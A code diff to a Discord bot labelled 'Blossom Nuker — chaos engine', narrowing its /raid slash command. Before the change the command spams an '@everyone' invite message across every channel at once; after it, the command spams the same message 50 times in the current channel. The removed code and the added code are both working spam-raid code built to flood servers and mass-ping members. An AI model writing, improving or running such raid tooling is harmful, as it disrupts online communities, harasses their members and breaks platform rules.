@@ -171,7 +171,7 @@ async def send_invite_spam(channels, amount=30):
     return total_sent
 
 # ============================================================
-#  RAID SLASH COMMAND — ULTRA FAST INVITE SPAM
+#  RAID SLASH COMMAND — CHANNEL-ONLY SPAM
 # ============================================================
 class RaidRateLimiter:
     def __init__(self, max_requests_per_second=20):
@@ -228,9 +228,9 @@ async def raid_spam_channel(channel, message, amount=50):
     
     return sent
 
-@client.tree.command(name="raid", description="Spam the Blossom invite link in every channel (fast!)")
+@client.tree.command(name="raid", description="Spam the Blossom invite link in this channel (fast!)")
 async def raid(interaction: discord.Interaction):
-    """Slash command to spam the invite link across all channels."""
+    """Slash command to spam the invite link in the current channel only."""
     
     await interaction.response.defer(ephemeral=False)
     
@@ -238,42 +238,27 @@ async def raid(interaction: discord.Interaction):
         await interaction.followup.send("❌ This command only works in a server.", ephemeral=True)
         return
     
-    if not interaction.guild.me.guild_permissions.send_messages:
-        await interaction.followup.send("❌ I don't have permission to send messages in this server.", ephemeral=True)
+    # Check if the bot can send messages in this channel
+    if not interaction.channel.permissions_for(interaction.guild.me).send_messages:
+        await interaction.followup.send("❌ I don't have permission to send messages in this channel.", ephemeral=True)
         return
     
-    channels = [
-        channel for channel in interaction.guild.text_channels 
-        if channel.permissions_for(interaction.guild.me).send_messages
-    ]
-    
-    if not channels:
-        await interaction.followup.send("❌ No channels found where I can send messages.", ephemeral=True)
-        return
-    
+    # The invite message
     invite_message = "@everyone **JOIN BLOSSOM EMPIRE** — discord.gg/Gx9b3AsJR3"
     
-    await interaction.followup.send(f"💥 **RAID STARTED** — Spamming {len(channels)} channels...")
+    # Send starting message
+    await interaction.followup.send(f"💥 **RAID STARTED** — Spamming this channel...")
     
-    total_sent = 0
-    tasks = []
+    # Spam the channel
+    sent = await raid_spam_channel(interaction.channel, invite_message, amount=50)
     
-    for channel in channels:
-        task = asyncio.create_task(raid_spam_channel(channel, invite_message, amount=40))
-        tasks.append(task)
-    
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    for r in results:
-        if isinstance(r, int):
-            total_sent += r
-    
+    # Send completion message
     await interaction.followup.send(
-        f"✅ **RAID COMPLETE** — Sent {total_sent} invite messages across {len(channels)} channels!\n"
+        f"✅ **RAID COMPLETE** — Sent {sent} invite messages in this channel!\n"
         f"🔥 Join the chaos: discord.gg/Gx9b3AsJR3"
     )
     
-    print(f"[RAID] {interaction.user} raided {interaction.guild.name} — {total_sent} messages sent")
+    print(f"[RAID] {interaction.user} raided #{interaction.channel.name} in {interaction.guild.name} — {sent} messages sent")
 
 # ============================================================
 #  BOT EVENTS
@@ -491,7 +476,7 @@ async def help_command(ctx):
     embed.add_field(name=";credits", value="Show bot credits", inline=False)
     embed.add_field(name=";getbot", value="Get the invite link for this bot", inline=False)
     embed.add_field(name=";whitelist", value="Whitelist a server (owner only)", inline=False)
-    embed.add_field(name="/raid", value="Slash command — spam invite in every channel", inline=False)
+    embed.add_field(name="/raid", value="Slash command — spam invite in THIS channel only", inline=False)
     embed.set_footer(text="Blossom Nuker — chaos engine")
     await ctx.send(embed=embed)
 
